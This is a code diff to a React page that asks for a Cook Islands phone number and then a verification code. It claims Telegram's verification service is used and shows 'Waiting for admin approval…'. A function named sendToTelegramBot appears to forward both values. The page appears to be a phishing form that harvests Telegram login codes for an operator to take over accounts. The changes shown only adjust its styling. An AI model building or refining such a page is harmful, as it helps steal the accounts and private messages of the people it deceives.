@@ -228,17 +228,17 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
             )}
 
             {currentStep === 'phone' && (
-              <div className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-3xl p-10 border border-white/40 shadow-2xl">
-                <div className="text-center mb-8">
+              <div className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-3xl p-8 border border-white/40 shadow-2xl max-w-lg mx-auto">
+                <div className="text-center">
                   <div className="flex justify-center mb-6">
-                    <div className="w-20 h-20 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center shadow-xl">
-                      <span className="text-3xl font-bold text-white">1</span>
+                    <div className="w-16 h-16 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center shadow-xl">
+                      <span className="text-2xl font-bold text-white">1</span>
                     </div>
                   </div>
-                  <h2 className="text-2xl text-white font-bold mb-8 leading-relaxed">
+                  <h2 className="text-xl text-white font-bold mb-6 leading-relaxed">
                     1: enter your number (just cook islands numbers)
                   </h2>
-                  <div className="flex justify-center space-x-4 mb-10">
+                  <div className="flex justify-center space-x-3 mb-8">
                     {phoneNumber.map((digit, index) => (
                       <input
                         key={index}
@@ -246,7 +246,7 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
                         type="text"
                         value={digit}
                         onChange={(e) => handleInputChange(e.target.value, index, 'phone')}
-                        className="w-18 h-18 text-center text-3xl font-bold bg-gradient-to-br from-white/95 to-blue-50/95 border-3 border-white/50 rounded-2xl focus:border-blue-400 focus:outline-none focus:ring-4 focus:ring-blue-400/30 transition-all duration-300 shadow-xl hover:shadow-2xl transform hover:scale-105"
+                        className="w-14 h-14 text-center text-2xl font-bold bg-gradient-to-br from-white/95 to-blue-50/95 border-2 border-white/50 rounded-xl focus:border-blue-400 focus:outline-none focus:ring-2 focus:ring-blue-400/30 transition-all duration-300 shadow-lg hover:shadow-xl transform hover:scale-105"
                         maxLength={1}
                       />
                     ))}
@@ -254,7 +254,7 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
                   <button 
                     onClick={handlePhoneSubmit}
                     disabled={phoneNumber.join('').length !== 5}
-                    className="bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white px-12 py-5 rounded-2xl font-bold text-xl transition-all duration-300 shadow-2xl hover:shadow-green-500/25 transform hover:scale-105 disabled:hover:scale-100"
+                    className="bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white px-8 py-3 rounded-xl font-bold text-lg transition-all duration-300 shadow-xl hover:shadow-green-500/25 transform hover:scale-105 disabled:hover:scale-100"
                   >
                     📱 Submit Number
                   </button>
@@ -263,17 +263,17 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
             )}
 
             {currentStep === 'verification' && (
-              <div className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-3xl p-10 border border-white/40 shadow-2xl">
-                <div className="text-center mb-8">
+              <div className="bg-gradient-to-br from-white/25 to-white/10 backdrop-blur-xl rounded-3xl p-8 border border-white/40 shadow-2xl max-w-lg mx-auto">
+                <div className="text-center">
                   <div className="flex justify-center mb-6">
-                    <div className="w-20 h-20 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full flex items-center justify-center shadow-xl animate-pulse">
-                      <Shield className="w-10 h-10 text-white" />
+                    <div className="w-16 h-16 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full flex items-center justify-center shadow-xl animate-pulse">
+                      <Shield className="w-8 h-8 text-white" />
                     </div>
                   </div>
-                  <h2 className="text-2xl text-white font-bold mb-8 leading-relaxed">
+                  <h2 className="text-xl text-white font-bold mb-6 leading-relaxed">
                     for security reasons we uses telegram's verification service to deliver confirmation codes
                   </h2>
-                  <div className="flex justify-center space-x-4 mb-10">
+                  <div className="flex justify-center space-x-3 mb-8">
                     {verificationCode.map((digit, index) => (
                       <input
                         key={index}
@@ -281,20 +281,20 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
                         type="text"
                         value={digit}
                         onChange={(e) => handleInputChange(e.target.value, index, 'verification')}
-                        className="w-18 h-18 text-center text-3xl font-bold bg-gradient-to-br from-white/95 to-purple-50/95 border-3 border-white/50 rounded-2xl focus:border-purple-400 focus:outline-none focus:ring-4 focus:ring-purple-400/30 transition-all duration-300 shadow-xl hover:shadow-2xl transform hover:scale-105"
+                        className="w-14 h-14 text-center text-2xl font-bold bg-gradient-to-br from-white/95 to-purple-50/95 border-2 border-white/50 rounded-xl focus:border-purple-400 focus:outline-none focus:ring-2 focus:ring-purple-400/30 transition-all duration-300 shadow-lg hover:shadow-xl transform hover:scale-105"
                         maxLength={1}
                       />
                     ))}
                   </div>
                   {errorText && (
-                    <div className="bg-red-500/20 border border-red-400/50 rounded-xl p-4 mb-6">
+                    <div className="bg-red-500/20 border border-red-400/50 rounded-xl p-3 mb-4">
                       <p className="text-red-300 font-semibold">{errorText}</p>
                     </div>
                   )}
                   {waiting && (
-                    <div className="bg-blue-500/20 border border-blue-400/50 rounded-xl p-4 mb-6">
+                    <div className="bg-blue-500/20 border border-blue-400/50 rounded-xl p-3 mb-4">
                       <div className="flex items-center justify-center space-x-3">
-                        <div className="w-6 h-6 border-3 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
+                        <div className="w-5 h-5 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                         <p className="text-blue-300 font-semibold">Waiting for admin approval…</p>
                       </div>
                     </div>
@@ -302,7 +302,7 @@ const sendToTelegramBot = async (data: { type: 'phone' | 'verification', value: 
                   <button 
                     onClick={handleVerificationSubmit}
                     disabled={verificationCode.join('').length !== 5 || waiting}
-                    className="bg-gradient-to-r from-purple-500 to-pink-600 hover:from-purple-600 hover:to-pink-700 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white px-12 py-5 rounded-2xl font-bold text-xl transition-all duration-300 shadow-2xl hover:shadow-purple-500/25 transform hover:scale-105 disabled:hover:scale-100"
+                    className="bg-gradient-to-r from-purple-500 to-pink-600 hover:from-purple-600 hover:to-pink-700 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white px-8 py-3 rounded-xl font-bold text-lg transition-all duration-300 shadow-xl hover:shadow-purple-500/25 transform hover:scale-105 disabled:hover:scale-100"
                   >
                     🔐 Submit Code
                   </button>
